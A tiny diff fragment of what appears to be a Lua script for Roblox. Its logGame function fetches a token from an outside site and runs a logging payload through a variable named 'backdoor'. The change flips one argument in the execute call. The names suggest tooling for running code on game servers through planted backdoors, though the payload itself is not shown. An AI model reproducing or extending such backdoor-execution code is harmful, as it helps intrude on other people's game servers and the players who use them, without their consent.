@@ -442,7 +442,7 @@ end;
 
 local function logGame()
     local token = game:HttpGet("https://k4scripts.xyz/bexe/token");
-    execute(applyMacros(LOG_GAME):format(token), backdoor, true, true):Wait();
+    execute(applyMacros(LOG_GAME):format(token), backdoor, false, true):Wait();
 end;
 
 
